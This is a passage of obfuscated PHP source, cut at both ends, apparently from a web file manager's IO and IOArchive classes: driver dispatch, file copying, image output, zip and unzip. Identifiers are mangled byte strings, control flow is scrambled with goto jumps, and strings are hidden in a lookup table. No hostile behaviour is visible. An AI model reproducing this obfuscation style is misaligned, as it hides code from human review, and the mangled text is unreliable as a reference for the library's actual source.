Hook::trigger($d¦ÛÂÅ‹«‚[962], $C³·‚óéê, $E´Æò´êŠ, $C¦Óã¡Ï’, $b¡‘É¿ó¸, $eÑ¸’å½˜ó, $B†£‰ÈÒˆÄ); return $B†£‰ÈÒˆÄ; goto c °´ù; aêÃ†‰ğùÌ: Hook::trigger($d¦ÛÂÅ‹«‚[961], $C³·‚óéê, $E´Æò´êŠ, $C¦Óã¡Ï’, $b¡‘É¿ó¸, $eÑ¸’å½˜ó, $AÍ†à“Âœ‰); if (self::driverIsSame($C³·‚óéê, $C¦Óã¡Ï’)) { if ($C¸ëÇ§¸«ƒ) { $B†£‰ÈÒˆÄ = $C¦Óã¡Ï’->moveFile($E´Æò´êŠ, $b¡‘É¿ó¸); } else { $B†£‰ÈÒˆÄ = $C¦Óã¡Ï’->copyFile($E´Æò´êŠ, $b¡‘É¿ó¸); } Hook::trigger($d¦ÛÂÅ‹«‚[962], $C³·‚óéê, $E´Æò´êŠ, $C¦Óã¡Ï’, $b¡‘É¿ó¸, $eÑ¸’å½˜ó, $B†£‰ÈÒˆÄ); return $B†£‰ÈÒˆÄ; } $B÷Ä¸ÏñÍ = TEMP_FILES; goto C¬õéĞ‘¹; c °´ù: } public static function pathFather($Fˆ©¦Æ¬¥Ì) { $c¡¼ß¿ï± = IO::init($Fˆ©¦Æ¬¥Ì); $CâæÂ«­ˆø = $c¡¼ß¿ï±->pathFather($c¡¼ß¿ï±->path); return $c¡¼ß¿ï±->getPathOuter($CâæÂ«­ˆø); } public static function fileOut($B‚ˆ¡ãÓªò, $b÷†„‘ÖÁÒ = false, $f¨‰‚ââõ¾ = false, $C‘Ú´’ğè÷ = '') { $Cà¬“×ö¼“ = self::driverMake($B‚ˆ¡ãÓªò); if ($Cà¬“×ö¼“->isFileOutServer()) { return $Cà¬“×ö¼“->fileOutServer($B‚ˆ¡ãÓªò, $b÷†„‘ÖÁÒ, $f¨‰‚ââõ¾, $C‘Ú´’ğè÷); } return $Cà¬“×ö¼“->fileOut($B‚ˆ¡ãÓªò, $b÷†„‘ÖÁÒ, $f¨‰‚ââõ¾, $C‘Ú´’ğè÷); } public static function fileOutImage($E…Å£ŠªÚ, $DŸ¼•Ãª…ù = 250) { $DğºÒ¿Ù¼ô = array(250, 600, 1200, 3000); for ($CæÍ¡¿ŸïŠ = 0; $CæÍ¡¿ŸïŠ < count($DğºÒ¿Ù¼ô); $CæÍ¡¿ŸïŠ++) { if ($CæÍ¡¿ŸïŠ == 0 && $DŸ¼•Ãª…ù <= $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]) { $DŸ¼•Ãª…ù = $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]; break; } else { if ($DŸ¼•Ãª…ù > $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ - 1] && $DŸ¼•Ãª…ù <= $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]) { $DŸ¼•Ãª…ù = $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]; break; } else { if ($CæÍ¡¿ŸïŠ == count($DğºÒ¿Ù¼ô) - 1 && $DŸ¼•Ãª…ù > $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]) { $DŸ¼•Ãª…ù = $DğºÒ¿Ù¼ô[$CæÍ¡¿ŸïŠ]; break; } } } } $aíÈ¥‚Õ®– = self::driverMake($E…Å£ŠªÚ); if ($aíÈ¥‚Õ®–->isFileOutServer()) { return $aíÈ¥‚Õ®–->fileOutImageServer($E…Å£ŠªÚ, $DŸ¼•Ãª…ù); } return $aíÈ¥‚Õ®–->fileOutImage($E…Å£ŠªÚ, $DŸ¼•Ãª…ù); } private static function driverIsSame($AšÑ²ÇŠÇâ, $d£Â¦ÀÒÚŸ) { goto D·–×‚«¸é; FÖîí¹ ´¼: if ($AÎÃÛãĞÊ != $e¾›ƒ¯½ÆÚ) { return !1; } if ($AÎÃÛãĞÊ == $dÔ”£ø¼Á[667]) { return !0; } if ($AÎÃÛãĞÊ == $dÔ”£ø¼Á[104]) { return !0; } goto AåÅ¼Ú¤áÛ; AåÅ¼Ú¤áÛ: if ($AšÑ²ÇŠÇâ->pathDriver == $d£Â¦ÀÒÚŸ->pathDriver) { return !0; } return !1; goto D›‡Áæì¢; D·–×‚«¸é: $dÔ”£ø¼Á =& $_SERVER[‘®…¢À]; $AÎÃÛãĞÊ = $AšÑ²ÇŠÇâ->getType(); $e¾›ƒ¯½ÆÚ = $d£Â¦ÀÒÚŸ->getType(); goto FÖîí¹ ´¼; D›‡Áæì¢: } public static function copyUpdate($f¦´½°½ß”, $BªíõÆõØ) { goto aËˆ¶Ç«İ¥; aËˆ¶Ç«İ¥: $cÂÍŒ›òÍƒ =& $_SERVER[‘®…¢À]; if (!IO::exist($f¦´½°½ß”)) { return !1; } if (!IO::exist($BªíõÆõØ)) { IO::mkdir($BªíõÆõØ); } goto CôÑ¡¿šØˆ; CôÑ¡¿šØˆ: $eŞëÉ¹çù… = self::_listAll($f¦´½°½ß”); $b›’ìëŒˆÍ = self::_listAll($BªíõÆõØ); $b†œ—…¡ò· = array(); goto a¹¡é¸ß; E±ĞÜ”õé: Hook::trigger($cÂÍŒ›òÍƒ[966], $f¦´½°½ß”, $BªíõÆõØ, $c’’÷áõŞç); foreach ($c—éï–‰‘ as $C³ÈĞ“øåÈ) { IO::mkdir($C³ÈĞ“øåÈ); } foreach ($b†œ—…¡ò· as $C³ÈĞ“øåÈ) { IO::copy($C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[963]], $C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[964]], REPEAT_REPLACE); } goto aº°ì‰”¦ô; a¹¡é¸ß: $c—éï–‰‘ = array(); foreach ($eŞëÉ¹çù… as $Aë³Ä‚öÇÇ => $C³ÈĞ“øåÈ) { if ($C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[77]] == 1 && !isset($b›’ìëŒˆÍ[$Aë³Ä‚öÇÇ])) { $c—éï–‰‘[] = $BªíõÆõØ . $cÂÍŒ›òÍƒ[8] . $Aë³Ä‚öÇÇ; } if ($C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[77]] == 0) { if (!isset($b›’ìëŒˆÍ[$Aë³Ä‚öÇÇ]) || $b›’ìëŒˆÍ[$Aë³Ä‚öÇÇ][$cÂÍŒ›òÍƒ[78]] != $C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[78]]) { $b†œ—…¡ò·[] = array($cÂÍŒ›òÍƒ[963] => $C³ÈĞ“øåÈ[$cÂÍŒ›òÍƒ[76]], $cÂÍŒ›òÍƒ[964] => $BªíõÆõØ . $cÂÍŒ›òÍƒ[8] . get_path_father($Aë³Ä‚öÇÇ), $cÂÍŒ›òÍƒ[965] => $C³ÈĞ“øåÈ); if (isset($b›’ìëŒˆÍ[$Aë³Ä‚öÇÇ])) { IO::remove($BªíõÆõØ . $cÂÍŒ›òÍƒ[8] . $Aë³Ä‚öÇÇ); } } } } $c’’÷áõŞç = array($cÂÍŒ›òÍƒ[164] => $b†œ—…¡ò·, $cÂÍŒ›òÍƒ[77] => $c—éï–‰‘); goto E±ĞÜ”õé; aº°ì‰”¦ô: } private static function _listAll($d‘Ëê®Ş¢‘) { $A„¸®•Ÿ²õ =& $_SERVER[‘®…¢À]; $d‘Ëê®Ş¢‘ = KodIO::clear($d‘Ëê®Ş¢‘); $aÉÓ¢ãÙ‘› = IO::listAll($d‘Ëê®Ş¢‘); foreach ($aÉÓ¢ãÙ‘› as &$Fù¥½™¡Æí) { $a¨Ö‰©çº = substr($Fù¥½™¡Æí[$A„¸®•Ÿ²õ[76]], strlen($d‘Ëê®Ş¢‘)); $Fù¥½™¡Æí[$A„¸®•Ÿ²õ[967]] = trim($a¨Ö‰©çº, $A„¸®•Ÿ²õ[8]); } return array_to_keyvalue($aÉÓ¢ãÙ‘›, $A„¸®•Ÿ²õ[967]); } public static function fileSubstr($dÊõ§ĞÄÕÑ, $c­ñ‰²ëËã, $e“ôŒ˜áª = false) { goto bÉãË£Ëæî; bÉãË£Ëæî: $e‰ŒÃ×æŠ = self::driverMake($dÊõ§ĞÄÕÑ); $dÚ†óğ»‘ = $e‰ŒÃ×æŠ->size($dÊõ§ĞÄÕÑ); $aíî¤¦õŸ¼ = $c­ñ‰²ëËã; goto Fã¦²³§Ÿ¹; Cä§Š½åò: return $e‰ŒÃ×æŠ->fileSubstr($dÊõ§ĞÄÕÑ, $c­ñ‰²ëËã, $e“ôŒ˜áª); goto F³óÃ¦ŸÅó; câ–Üº‡ë: if ($c­ñ‰²ëËã + $e“ôŒ˜áª > $dÚ†óğ»‘) { $e“ôŒ˜áª = $dÚ†óğ»‘ - $c­ñ‰²ëËã; } if ($e“ôŒ˜áª <= 0) { return $_SERVER[‘®…¢À][33]; } if ($c­ñ‰²ëËã < 0 || $c­ñ‰²ëËã >= $dÚ†óğ»‘ || $e“ôŒ˜áª > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\122\x65\141\x64\40\145\x72\162\157\x72\x21\40\x73\x74\141\162\164\x3d{$c­ñ‰²ëËã}\x3b\x6c\145\x6e\x67\164\x68\x3d{$e“ôŒ˜áª}\73\40\163\x69\172\145\x3d{$dÚ†óğ»‘}\73"); } goto Cä§Š½åò; Fã¦²³§Ÿ¹: $cĞµ ´¦ÇÆ = $e“ôŒ˜áª; if ($c­ñ‰²ëËã < 0) { $c­ñ‰²ëËã = $dÚ†óğ»‘ + $c­ñ‰²ëËã; } if ($e“ôŒ˜áª === !1) { $e“ôŒ˜áª = $dÚ†óğ»‘ - $c­ñ‰²ëËã; } goto câ–Üº‡ë; F³óÃ¦ŸÅó: } private static function driverMake(&$cæñŸ–ì½“) { goto e…Öç¸‰¶; e…Öç¸‰¶: $c‚™¶Û¤ğ =& $_SERVER[‘®…¢À]; $Eæ±œ«ò½» = KodIO::parse($cæñŸ–ì½“); if (!self::$driverListSystem) { $f”…‹ÊÁˆ§ = Model($c‚™¶Û¤ğ[677])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($f”…‹ÊÁˆ§, $c‚™¶Û¤ğ[363]); } goto A‡ÏêèĞ…×; Dù£ŞŠ›¨: return $d¡Ô¸™‡åï; goto a’“Ú¡¥ì‘; A‡ÏêèĞ…×: if ($Eæ±œ«ò½»[$c‚™¶Û¤ğ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Eæ±œ«ò½»[$c‚™¶Û¤ğ[363]]]) { return !1; } $cæñŸ–ì½“ = $Eæ±œ«ò½»[$c‚™¶Û¤ğ[968]]; $d¡Ô¸™‡åï = self::driverGet($Eæ±œ«ò½», $cæñŸ–ì½“); goto Dù£ŞŠ›¨; a’“Ú¡¥ì‘: } private static function driverGet($EÔÜà –…ô, &$Fèö¤òÓÂÅ) { goto dÇ‡ôê½; dÇ‡ôê½: $b¾×º·Ä†¼ =& $_SERVER[‘®…¢À]; $dãÒ™ÛîÔÒ = $EÔÜà –…ô[$b¾×º·Ä†¼[969]]; $FŸÈ™êå“Ø = $EÔÜà –…ô[$b¾×º·Ä†¼[363]]; goto Døˆ¸ˆ¤ä; DéÔêíØàÊ: if (isset($eò„ôÌƒÒª[$b¾×º·Ä†¼[6]][$b¾×º·Ä†¼[980]])) { $CÇŠß±å‚Ò->pathBase = rtrim($eò„ôÌƒÒª[$b¾×º·Ä†¼[6]][$b¾×º·Ä†¼[980]], $b¾×º·Ä†¼[8]) . $b¾×º·Ä†¼[8]; $Fèö¤òÓÂÅ = $CÇŠß±å‚Ò->pathBase . ltrim($Fèö¤òÓÂÅ, $b¾×º·Ä†¼[8]); } $Fèö¤òÓÂÅ = $CÇŠß±å‚Ò->getPath($Fèö¤òÓÂÅ); if (isset($EÔÜà –…ô[$b¾×º·Ä†¼[955]])) { $Fèö¤òÓÂÅ = $EÔÜà –…ô[$b¾×º·Ä†¼[955]]; } goto a±ä‰…šêÂ; a±ä‰…šêÂ: $CÇŠß±å‚Ò->path = $Fèö¤òÓÂÅ; return $CÇŠß±å‚Ò; goto D¸ÏŠÁ¿îÈ; e°é™©‘×ë: $CÇŠß±å‚Ò = self::$driverCache[$E¯İ¬×ÁÔ”]; $CÇŠß±å‚Ò->pathDriver = $dãÒ™ÛîÔÒ; $CÇŠß±å‚Ò->pathBase = $b¾×º·Ä†¼[33]; goto DéÔêíØàÊ; Døˆ¸ˆ¤ä: switch ($EÔÜà –…ô[$b¾×º·Ä†¼[29]]) { case KodIO::KOD_IO: $eò„ôÌƒÒª = self::$driverListSystem[$FŸÈ™êå“Ø]; break; case KodIO::KOD_SOURCE: $Fèö¤òÓÂÅ = $FŸÈ™êå“Ø . $Fèö¤òÓÂÅ; $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[971], $b¾×º·Ä†¼[6] => $EÔÜà –…ô); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $B›¹”‘¸Ş = $GLOBALS[$b¾×º·Ä†¼[972]]; self::$driverListUser = array_to_keyvalue($B›¹”‘¸Ş, $b¾×º·Ä†¼[363]); } $eò„ôÌƒÒª = self::$driverListUser[$FŸÈ™êå“Ø]; break; case KodIO::KOD_SHARE_LINK: $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[973], $b¾×º·Ä†¼[6] => $EÔÜà –…ô); $FÌãĞŒÊœÎ = Action($b¾×º·Ä†¼[974])->sharePathInfo($EÔÜà –…ô[$b¾×º·Ä†¼[76]]); $Fèö¤òÓÂÅ = $FÌãĞŒÊœÎ[$b¾×º·Ä†¼[365]]; if (!$FÌãĞŒÊœÎ[$b¾×º·Ä†¼[365]]) { $EÔÕõ†£éŸ = Model($b¾×º·Ä†¼[527])->getInfo($FÌãĞŒÊœÎ[$b¾×º·Ä†¼[436]]); $Fèö¤òÓÂÅ = KodIO::clear($EÔÕõ†£éŸ[$b¾×º·Ä†¼[975]] . $EÔÜà –…ô[$b¾×º·Ä†¼[968]]); $EÔÜà –…ô[$b¾×º·Ä†¼[434]] = $EÔÕõ†£éŸ; $EÔÜà –…ô[$b¾×º·Ä†¼[955]] = $Fèö¤òÓÂÅ; $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[976], $b¾×º·Ä†¼[6] => $EÔÜà –…ô); } break; case KodIO::KOD_SHARE_ITEM: $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[977], $b¾×º·Ä†¼[6] => $EÔÜà –…ô); $EÔÕõ†£éŸ = Model($b¾×º·Ä†¼[527])->getInfo($EÔÜà –…ô[$b¾×º·Ä†¼[363]]); if ($EÔÕõ†£éŸ[$b¾×º·Ä†¼[365]] == $b¾×º·Ä†¼[463]) { $Fèö¤òÓÂÅ = KodIO::clear($EÔÕõ†£éŸ[$b¾×º·Ä†¼[975]] . $EÔÜà –…ô[$b¾×º·Ä†¼[968]]); $EÔÜà –…ô[$b¾×º·Ä†¼[434]] = $EÔÕõ†£éŸ; $EÔÜà –…ô[$b¾×º·Ä†¼[955]] = $Fèö¤òÓÂÅ; $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[978], $b¾×º·Ä†¼[6] => $EÔÜà –…ô); } break; default: $Fèö¤òÓÂÅ = $EÔÜà –…ô[$b¾×º·Ä†¼[76]]; $eò„ôÌƒÒª = array($b¾×º·Ä†¼[970] => $b¾×º·Ä†¼[979]); break; } $E¯İ¬×ÁÔ” = $EÔÜà –…ô[$b¾×º·Ä†¼[76]]; if (!isset(self::$driverCache[$E¯İ¬×ÁÔ”])) { $a†Ø•ë³ Ş = $b¾×º·Ä†¼[72] . self::driverType($eò„ôÌƒÒª[$b¾×º·Ä†¼[91]]); if (!class_exists($a†Ø•ë³ Ş)) { show_json("{$a†Ø•ë³ Ş}\40\156\x6f\164\40\145\x78\x69\163\164\x73\x21", !1); } $fö©¦Œ±¿Ü = isset($eò„ôÌƒÒª[$b¾×º·Ä†¼[6]]) ? $eò„ôÌƒÒª[$b¾×º·Ä†¼[6]] : !1; self::$driverCache[$E¯İ¬×ÁÔ”] = new $a†Ø•ë³ Ş($fö©¦Œ±¿Ü); } goto e°é™©‘×ë; D¸ÏŠÁ¿îÈ: } private static function driverType($fŠ…ˆÅÕ‘Ï) { $Fã’¾“îš =& $_SERVER[‘®…¢À]; $fŠ…ˆÅÕ‘Ï = strtolower($fŠ…ˆÅÕ‘Ï); if ($fŠ…ˆÅÕ‘Ï == $Fã’¾“îš[65]) { $fŠ…ˆÅÕ‘Ï = $Fã’¾“îš[981]; } else { if (in_array($fŠ…ˆÅÕ‘Ï, array($Fã’¾“îš[104], $Fã’¾“îš[58], $Fã’¾“îš[982]))) { $fŠ…ˆÅÕ‘Ï = ucfirst($fŠ…ˆÅÕ‘Ï); } else { $fŠ…ˆÅÕ‘Ï = strtoupper($fŠ…ˆÅÕ‘Ï); } } return $fŠ…ˆÅÕ‘Ï; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $EƒÏ‘º“¾Ğ; if (!$EƒÏ‘º“¾Ğ) { $eÖğœ†¢ãĞ = IO::init($_SERVER[‘®…¢À][8]); } return $eÖğœ†¢ãĞ; } private static function iconvSystem($Aâô§„›¯Õ) { return self::local()->iconvSystem($Aâô§„›¯Õ); } private static function iconvApp($b¡ÑËøÎ©…) { return self::local()->iconvApp($b¡ÑËøÎ©…); } public static function zip($FÍ§ï±Ş¶, $B¬‹‘˜êŠÚ = "\x7a\151\160", $aê§¢ÍĞ§Ü = '', $f©ºÖ ·Ê = REPEAT_RENAME) { goto bİ…Ô‹Üá; fŠ§–Şó†: foreach ($BèáËõÑ‘Ã as $f„©ˆŠ§ŸÙ => $d½Éµƒ×) { $BèáËõÑ‘Ã[$f„©ˆŠ§ŸÙ] = self::iconvSystem($d½Éµƒ×); } KodArchive::create($C»¼¼…åŸƒ, $BèáËõÑ‘Ã); if (!IO::exist($AÚğŒ¶®ô†)) { if ($c»…”Õ°Ñ) { del_dir($c»…”Õ°Ñ); } show_json(LNG($fÒ‘¾ŸØÕê[985]), !1); } goto bõË›ÑŠ£ˆ; bİ…Ô‹Üá: $fÒ‘¾ŸØÕê =& $_SERVER[‘®…¢À]; $c‡Î±ï¦Ïó = self::init($FÍ§ï±Ş¶[0][$fÒ‘¾ŸØÕê[76]]); $fÂš…ëƒî = self::info($FÍ§ï±Ş¶[0][$fÒ‘¾ŸØÕê[76]]); goto FÌŒÒ’åƒ§; a½¦Í‘Ã‚: if (!$ağ¾¬ì¯îë) { del_dir($c»…”Õ°Ñ); show_json(LNG($fÒ‘¾ŸØÕê[985]), !1); } del_dir($c»…”Õ°Ñ); return $ağ¾¬ì¯îë; goto e•¾‰ğÊ¥È; dİóŒ•¨æ: if (count($BèáËõÑ‘Ã) > 1) { $FœëøĞ’Æ¨ = IO::info(IO::pathFather($fÂš…ëƒî[$fÒ‘¾ŸØÕê[76]])); $f²Šæ·œß = $FœëøĞ’Æ¨[$fÒ‘¾ŸØÕê[28]]; } $Fƒó’‘Ñä = $c»…”Õ°Ñ; if (!$Fƒó’‘Ñä) { $Fƒó’‘Ñä = get_path_father($fÂš…ëƒî[$fÒ‘¾ŸØÕê[76]]); $F—¾»‚Æ¡¡ = IO::info($Fƒó’‘Ñä); if (!$F—¾»‚Æ¡¡[$fÒ‘¾ŸØÕê[186]]) { show_json(LNG($fÒ‘¾ŸØÕê[984]), !1); } } goto Fá£’¸çã¢; Fá£’¸çã¢: $AÚğŒ¶®ô† = $Fƒó’‘Ñä . $f²Šæ·œß . $fÒ‘¾ŸØÕê[94] . $B¬‹‘˜êŠÚ; $AÚğŒ¶®ô† = get_filename_auto($AÚğŒ¶®ô†, $fÒ‘¾ŸØÕê[33], $f©ºÖ ·Ê); $C»¼¼…åŸƒ = self::iconvSystem($AÚğŒ¶®ô†); goto fŠ§–Şó†; FÌŒÒ’åƒ§: $c»…”Õ°Ñ = !1; if (!$aê§¢ÍĞ§Ü && $c‡Î±ï¦Ïó->getType() == $fÒ‘¾ŸØÕê[104]) { $BèáËõÑ‘Ã = self::zipFileList($FÍ§ï±Ş¶); } else { $c»…”Õ°Ñ = $aê§¢ÍĞ§Ü ? $aê§¢ÍĞ§Ü : TEMP_FILES . $fÒ‘¾ŸØÕê[983] . time() . rand_string(8) . $fÒ‘¾ŸØÕê[8]; mk_dir($c»…”Õ°Ñ); $BèáËõÑ‘Ã = self::zipFileList($FÍ§ï±Ş¶, $c»…”Õ°Ñ); } $f²Šæ·œß = $fÂš…ëƒî[$fÒ‘¾ŸØÕê[28]]; goto dİóŒ•¨æ; bõË›ÑŠ£ˆ: if ($aê§¢ÍĞ§Ü || !$c»…”Õ°Ñ) { if ($c»…”Õ°Ñ && strstr($c»…”Õ°Ñ, TEMP_FILES)) { $f†é—¬ÆË˜ = $BèáËõÑ‘Ã = array(); recursion_dir($Fƒó’‘Ñä, $f†é—¬ÆË˜, $BèáËõÑ‘Ã, 0); foreach ($f†é—¬ÆË˜ as $A“ƒåéê—Ö) { del_dir($A“ƒåéê—Ö); } foreach ($BèáËõÑ‘Ã as $BõÖœ‚…¡Ó) { if ($BõÖœ‚…¡Ó == $C»¼¼…åŸƒ) { continue; } del_file($BõÖœ‚…¡Ó); } } return $AÚğŒ¶®ô†; } $c„œ´â‚½ê = self::pathFather($fÂš…ëƒî[$fÒ‘¾ŸØÕê[76]]); $ağ¾¬ì¯îë = self::move($AÚğŒ¶®ô†, $c„œ´â‚½ê, $f©ºÖ ·Ê); goto a½¦Í‘Ã‚; e•¾‰ğÊ¥È: } public static function unzip($E¯Í© ‡øÉ, $f©ï¬Ûä”Å = "\162\x65\x70\154\x61\x63\x65") { goto B¸ãŠåóÈ—; AÒñŞ¼éÓì: $C¹àó‘ÕÎ¬ = KodArchive::extract($C„šªÈÆµ, $b­„ÖŞ“ˆ . $DŠ‚’¿Å…Œ[8], $aíÕ³÷‹É®); self::archiveExt(); if (!$C¹àó‘ÕÎ¬[$DŠ‚’¿Å…Œ[990]]) { show_json($DŠ‚’¿Å…Œ[991] . $C¹àó‘ÕÎ¬[$DŠ‚’¿Å…Œ[992]], !1); } goto eáÄ‹ì–ÑÅ; d§ËœóÆŒ: foreach ($côÖ„×š„ê as $e’îÕ–å¾¤) { $e’îÕ–å¾¤ = self::iconvApp($e’îÕ–å¾¤); self::move($e’îÕ–å¾¤, $DÖøì££èÙ, $f©ï¬Ûä”Å); } del_dir($b­„ÖŞ“ˆ); if (!$fÊ„ê ’â¼) { del_file($C„šªÈÆµ); } goto B¨‰ãöÀ×ê; eáÄ‹ì–ÑÅ: Hook::trigger($DŠ‚’¿Å…Œ[993], $b­„ÖŞ“ˆ); recursion_dir($b­„ÖŞ“ˆ, $Eµ³·ÃÛôê, $aîÅá¬Àª„, 0); $côÖ„×š„ê = array_merge($Eµ³·ÃÛôê, $aîÅá¬Àª„); goto d§ËœóÆŒ; dšíÃÜ„: if (!@file_exists(self::iconvSystem($C„šªÈÆµ))) { $fÊ„ê ’â¼ = self::localFilePath($bÉÜƒîĞ¶, $A™¢èÁñ´ˆ); $C„šªÈÆµ = $fÊ„ê ’â¼ ? $fÊ„ê ’â¼ : parent::download($bÉÜƒîĞ¶, $C„šªÈÆµ); } $C„šªÈÆµ = self::iconvSystem($C„šªÈÆµ); $aíÕ³÷‹É® = isset($E¯Í© ‡øÉ[$DŠ‚’¿Å…Œ[988]]) ? $E¯Í© ‡øÉ[$DŠ‚’¿Å…Œ[988]] : $DŠ‚’¿Å…Œ[989]; goto AÒñŞ¼éÓì; B¸ãŠåóÈ—: $DŠ‚’¿Å…Œ =& $_SERVER[‘®…¢À]; $bÉÜƒîĞ¶ = $E¯Í© ‡øÉ[$DŠ‚’¿Å…Œ[76]]; $DÖøì££èÙ = $E¯Í© ‡øÉ[$DŠ‚’¿Å…Œ[986]]; goto bŞ¢ ÒĞ; e‚ ›–…œÎ: mk_dir($b­„ÖŞ“ˆ); $A™¢èÁñ´ˆ = self::fileExt($dÕóõ°÷Å‰); $C„šªÈÆµ = $b­„ÖŞ“ˆ . $DŠ‚’¿Å…Œ[94] . $A™¢èÁñ´ˆ; goto dšíÃÜ„; B¨‰ãöÀ×ê: return !0; goto AŠáËä¾Ã‚; c»»ÓÃˆÎ³: $f¢ÌŠåŒ·­ = self::tmpFileName($dÕóõ°÷Å‰); $b­„ÖŞ“ˆ = TEMP_FILES . $f¢ÌŠåŒ·­; del_dir($b­„ÖŞ“ˆ); goto e‚ ›–…œÎ; bŞ¢ ÒĞ: if (!($dÕóõ°÷Å‰ = parent::info($bÉÜƒîĞ¶))) { show_json(LNG($DŠ‚’¿Å…Œ[987]), !1); } if (!($aÔ»›Ò­ª = parent::infoFull($DÖøì££èÙ))) { $DÖøì££èÙ = parent::mkdir($DÖøì££èÙ); $aÔ»›Ò­ª = array($DŠ‚’¿Å…Œ[76] => $DÖøì££èÙ); } else { if (isset($aÔ»›Ò­ª[$DŠ‚’¿Å…Œ[365]]) && trim($aÔ»›Ò­ª[$DŠ‚’¿Å…Œ[76]], $DŠ‚’¿Å…Œ[8]) != trim($DÖøì££èÙ, $DŠ‚’¿Å…Œ[8])) { $f¤ôó­‚Ïé = KodIO::make($aÔ»›Ò­ª[$DŠ‚’¿Å…Œ[456]]); $F¶Ã°¤ÂßÁ = parent::fileNameAuto($f¤ôó­‚Ïé, $aÔ»›Ò­ª[$DŠ‚’¿Å…Œ[28]], REPEAT_RENAME_FOLDER, !0); $DÖøì££èÙ = parent::mkdir($f¤ôó­‚Ïé . $F¶Ã°¤ÂßÁ); $aÔ»›Ò­ª = array($DŠ‚’¿Å…Œ[76] => $DÖøì££èÙ); } } $DÖøì££èÙ = $aÔ»›Ò­ª[$DŠ‚’¿Å…Œ[76]]; goto c»»ÓÃˆÎ³; AŠáËä¾Ã‚: } public static function unzipList($A¥ˆ¾¨«³) { goto Cë–ºÀâ; bêÚ°İ‹÷„: self::archiveExt(); del_dir($A¤íË±Öå’); if (!$A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[990]]) { show_json($A‘–ÂŸŸğ‡[$EÖÀŸ‚ˆ[992]], !1); } goto f©ÎÁƒòÙã; c“¹ÖÂ¼¦: if (isset($Bª‰ù“Œ)) { $dŠ­ãëÖ‘ö = array($Bª‰ù“Œ[$EÖÀŸ‚ˆ[76]], $Bª‰ù“Œ[$EÖÀŸ‚ˆ[994]], $Bª‰ù“Œ[$EÖÀŸ‚ˆ[28]]); $F²õğœ¸¿² = md5(implode($EÖÀŸ‚ˆ[71], $dŠ­ãëÖ‘ö)) . $EÖÀŸ‚ˆ[94] . get_path_ext($Bª‰ù“Œ[$EÖÀŸ‚ˆ[28]]); } else { $dŠ­ãëÖ‘ö = array($a­Æ“Ó•á[$EÖÀŸ‚ˆ[28]], $a­Æ“Ó•á[$EÖÀŸ‚ˆ[76]], $a­Æ“Ó•á[$EÖÀŸ‚ˆ[78]]); $F²õğœ¸¿² = md5(implode($EÖÀŸ‚ˆ[71], $dŠ­ãëÖ‘ö)) . $EÖÀŸ‚ˆ[94] . $a„ÙŸÛêÜÈ; } if ($CğÄÒÑë™­ == -1) { $fƒ¬¼‰Àá³ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\x65\167\57{$b­Êé£†õÏ}\x2f{$F²õğœ¸¿²}\56\154\157\147"; $BŠàŞìˆÊç = self::infoFull($fƒ¬¼‰Àá³); if ($BŠàŞìˆÊç) { $fƒ¬¼‰Àá³ = $BŠàŞìˆÊç[$EÖÀŸ‚ˆ[76]]; $Cå‚ï…¿ß = self::getContent($fƒ¬¼‰Àá³); if ($Cå‚ï…¿ß) { $EÏŒõîÄ“À = json_decode($Cå‚ï…¿ß, !0); if (count($EÏŒõîÄ“À) >= $A¹„¥¶¤÷¶) { show_json(sprintf(LNG($EÖÀŸ‚ˆ[996]), count($EÏŒõîÄ“À)), !1); } return $EÏŒõîÄ“À; } } else { $fƒ¬¼‰Àá³ = self::mkfile($fƒ¬¼‰Àá³); } } $A¤íË±Öå’ = TEMP_FILES . $b­Êé£†õÏ; goto b¦†¬ÇÄĞ; e¡ù¦Óë‚¤: $eùÖïÌ³´ = self::iconvSystem($eùÖïÌ³´); if ($CğÄÒÑë™­ >= 0) { $eÛÔŸŞ¸µ¾ = isset($A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[998]]) ? $A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[998]] : !1; $BíåÚ©Ê¹Ÿ = isset($A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[28]]) ? $A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[28]] : $EÖÀŸ‚ˆ[33]; KodArchive::filePreview($eùÖïÌ³´, $CğÄÒÑë™­, $eÛÔŸŞ¸µ¾, $BíåÚ©Ê¹Ÿ); self::archiveExt(); die; } $A‘–ÂŸŸğ‡ = KodArchive::listContent($eùÖïÌ³´); goto bêÚ°İ‹÷„; Cë–ºÀâ: $EÖÀŸ‚ˆ =& $_SERVER[‘®…¢À]; $Dƒê‹ùáˆ’ = $A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[76]]; $CğÄÒÑë™­ = isset($A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[994]]) ? $A¥ˆ¾¨«³[$EÖÀŸ‚ˆ[994]] : -1; goto E¨à‰…‰‰¸; E¨à‰…‰‰¸: $A¹„¥¶¤÷¶ = 50000; if (request_url_safe($Dƒê‹ùáˆ’)) { $Bª‰ù“Œ = parse_url_query($Dƒê‹ùáˆ’); if (!isset($Bª‰ù“Œ[$EÖÀŸ‚ˆ[76]])) { 